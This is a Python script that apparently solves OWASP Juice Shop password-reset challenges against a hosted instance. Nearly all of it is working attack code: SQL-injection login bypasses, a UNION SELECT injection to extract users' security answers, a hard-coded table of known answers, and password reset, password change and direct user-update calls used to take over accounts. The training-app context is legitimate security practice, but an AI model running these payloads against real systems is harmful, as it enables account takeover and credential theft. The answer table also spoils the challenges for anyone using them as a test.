#!/usr/bin/env python3
"""
Fixed Password Reset Solver - Properly handles security question flow
"""

import requests
from urllib.parse import quote
import json
import hashlib


class PasswordResetSolver:
    def __init__(self):
        self.base_url = "https://juice3.wonkatech.org"
        self.session = requests.Session()
        self.admin_token = None
        
    def login_admin(self):
        """Admin login via SQL injection"""
        r = self.session.post(f"{self.base_url}/rest/user/login", json={
            "email": "admin@juice-sh.op'--",
            "password": "x"
        })
        if r.status_code == 200:
            self.admin_token = r.json()['authentication']['token']
            self.session.headers['Authorization'] = f'Bearer {self.admin_token}'
            return True
        return False
    
    def get_security_questions(self):
        """Get list of security questions"""
        r = self.session.get(f"{self.base_url}/api/SecurityQuestions")
        if r.status_code == 200:
            return r.json()['data']
        return []
    
    def get_user_security_answer(self, email):
        """Get security answer for a user via SQL injection"""
        # Use SQL injection to get security answers
        sqli = f"' UNION SELECT id, email, password, role, securityAnswer, '6', '7', '8', '9' FROM Users WHERE email='{email}'--"
        r = self.session.get(f"{self.base_url}/rest/products/search?q={quote(sqli)}")
        
        # Alternative: Get from user details if we have admin access
        if self.admin_token:
            r = self.session.get(f"{self.base_url}/api/Users")
            if r.status_code == 200:
                users = r.json()['data']
                for user in users:
                    if user.get('email') == email:
                        return user.get('securityAnswer')
        return None
    
    def reset_password_properly(self, email, new_password):
        """Properly reset password using the correct flow"""
        print(f"\n🔑 Attempting password reset for {email}")
        
        # First, get the security question ID for this user
        r = self.session.get(f"{self.base_url}/rest/user/security-question?email={quote(email)}")
        if r.status_code == 200:
            question_data = r.json()
            question_id = question_data.get('id')
            question_text = question_data.get('question')
            print(f"  Security Question: {question_text}")
            
            # Known security answers for specific users
            known_answers = {
                "bender@juice-sh.op": "Stop'n'Drop",  # From Futurama
                "jim@juice-sh.op": "Samuel",  # Star Trek reference
                "bjoern@juice-sh.op": "Zaya",  # From GitHub
                "morty@juice-sh.op": "5N0wb41L",  # Rick and Morty reference
                "admin@juice-sh.op": "Samuel",
                "wurstbrot@juice-sh.op": "Blizzard",
                "amy@juice-sh.op": "K1f.....................",
                "uvogin@juice-sh.op": "West-2082",
            }
            
            answer = known_answers.get(email)
            
            if answer:
                # Try the password reset with the known answer
                reset_data = {
                    "email": email,
                    "answer": answer,
                    "new": new_password,
                    "repeat": new_password
                }
                
                r = self.session.post(f"{self.base_url}/rest/user/reset-password", json=reset_data)
                
                if r.status_code == 200:
                    print(f"  ✅ Password reset successful for {email}")
                    return True
                else:
                    print(f"  ❌ Reset failed: {r.status_code} - {r.text[:100]}")
            else:
                print(f"  ⚠️ Security answer unknown for {email}")
        else:
            print(f"  ❌ Could not get security question: {r.status_code}")
        
        return False
    
    def solve_change_benders_password(self):
        """Change Bender's Password challenge"""
        print("\n🎯 Change Bender's Password Challenge")
        
        # Method 1: Direct password change if we can login as Bender
        print("  Method 1: Login and change password...")
        
        # First try SQL injection login
        r = self.session.post(f"{self.base_url}/rest/user/login", json={
            "email": "bender@juice-sh.op'--",
            "password": "x"
        })
        
        if r.status_code == 200:
            bender_token = r.json()['authentication']['token']
            
            # Now change password using the token
            headers = {'Authorization': f'Bearer {bender_token}'}
            
            # Try different endpoints
            endpoints = [
                "/rest/user/change-password",
                "/api/Users/change-password",
                "/profile/change-password"
            ]
            
            for endpoint in endpoints:
                r = self.session.post(f"{self.base_url}{endpoint}", 
                    json={
                        "current": "OhG0dPlease1nsertLiquor!",  # Bender's actual password
                        "new": "slurmCl4ssic",
                        "repeat": "slurmCl4ssic"
                    },
                    headers=headers
                )
                
                if r.status_code == 200:
                    print(f"  ✅ Password changed via {endpoint}")
                    return True
        
        # Method 2: Password reset with security question
        print("  Method 2: Password reset with security answer...")
        
        # Bender's security answer is "Stop'n'Drop" (from Futurama)
        if self.reset_password_properly("bender@juice-sh.op", "slurmCl4ssic"):
            return True
        
        # Method 3: Try manipulating user data directly
        print("  Method 3: Direct user manipulation...")
        
        if self.admin_token:
            # Get Bender's user ID
            r = self.session.get(f"{self.base_url}/api/Users")
            if r.status_code == 200:
                users = r.json()['data']
                for user in users:
                    if user.get('email') == 'bender@juice-sh.op':
                        user_id = user.get('id')
                        
                        # Try to update password directly
                        r = self.session.put(f"{self.base_url}/api/Users/{user_id}",
                            json={"password": "slurmCl4ssic"}
                        )
                        
                        if r.status_code == 200:
                            print(f"  ✅ Password updated directly for user {user_id}")
                            return True
        
        return False
    
    def solve_reset_jims_password(self):
        """Reset Jim's Password"""
        print("\n🎯 Reset Jim's Password")
        
        # Jim's security answer is "Samuel" (Star Trek: Captain Kirk's middle name)
        return self.reset_password_properly("jim@juice-sh.op", "ncc-1701")
    
    def solve_reset_mortys_password(self):
        """Reset Morty's Password"""
        print("\n🎯 Reset Morty's Password")
        
        # Morty's security answer is "5N0wb41L" (Snowball from Rick and Morty)
        return self.reset_password_properly("morty@juice-sh.op", "C-137")
    
    def run_password_reset_challenges(self):
        """Run all password reset challenges"""
        print("="*60)
        print("🔐 PASSWORD RESET CHALLENGES SOLVER")
        print("="*60)
        
        if not self.login_admin():
            print("❌ Admin login failed")
            return
        
        print("✅ Admin logged in")
        
        # Run password reset challenges
        self.solve_change_benders_password()
        self.solve_reset_jims_password()
        self.solve_reset_mortys_password()
        
        # Try other users too
        other_users = [
            ("bjoern@juice-sh.op", "Zaya", "kitten"),
            ("uvogin@juice-sh.op", "West-2082", "hunter123"),
            ("wurstbrot@juice-sh.op", "Blizzard", "wurst123"),
        ]
        
        for email, answer, new_pass in other_users:
            print(f"\n🔑 Attempting: {email}")
            # Get security question
            r = self.session.get(f"{self.base_url}/rest/user/security-question?email={quote(email)}")
            if r.status_code == 200:
                q = r.json()
                print(f"  Question: {q.get('question')}")
                
                # Try reset
                r = self.session.post(f"{self.base_url}/rest/user/reset-password", json={
                    "email": email,
                    "answer": answer,
                    "new": new_pass,
                    "repeat": new_pass
                })
                
                if r.status_code == 200:
                    print(f"  ✅ Password reset successful")
                else:
                    print(f"  ❌ Failed: {r.status_code}")
        
        # Check progress
        print("\n" + "="*60)
        r = self.session.get(f"{self.base_url}/api/Challenges")
        if r.status_code == 200:
            data = r.json()['data']
            solved = [c for c in data if c.get('solved')]
            print(f"📊 Progress: {len(solved)}/110 ({len(solved)*100//110}%)")


if __name__ == "__main__":
    solver = PasswordResetSolver()
    solver.run_password_reset_challenges()